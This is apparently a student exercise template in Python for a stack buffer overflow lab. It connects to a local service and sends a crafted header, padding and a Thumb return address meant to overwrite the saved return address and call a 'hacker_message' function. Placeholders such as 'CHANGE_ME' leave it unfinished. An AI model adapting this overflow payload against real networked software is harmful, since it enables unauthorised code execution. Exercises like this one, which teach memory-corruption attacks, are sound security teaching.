import socket
import struct
import os

HOST = "127.0.0.1"
PORT =  os.getuid() + 1024

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(f'Connecting to {HOST} using port {PORT} (from UID)')

    s.connect((HOST, PORT))
    print(f'Connected')

    # Address for triggering hacker_message (need to add "+ 1" to indicate that Thumb instructions are used)
    # You objective is to create a buffer overflow that overwrite the return address with this value
    hacker_message_address = 0x00020000 + 1

    # Create protocol header. The header is defined as:
    # 	uint16_t magic_value;      // Magic value is always 0x1234
	#   uint16_t payload_length;   // Length of the data after protocol header
    protocol_header = struct.pack('<HH',
        0x1234,         # magic_value
        0xCHANGE_ME     # payload_length - you need to set this!
    )

    # Create some pad data for filling the rx buffer and placing hacker_message_address at correct address
    pad_data = b''
    for i in range(30): # <=CHANGE_ME: You will need to adjust the padding length for placing hacker_message_address correctly
        pad_data += i.to_bytes(1, 'little')

    # Send the data for overwriting return address
    data = protocol_header + pad_data + hacker_message_address.to_bytes(4, 'little')
    print('Sending data:')
    print(f'0x{data.hex()}')
    s.sendall(data)

    # Receive response
    data = s.recv(1024)
    print("Received data:")
    print(data)
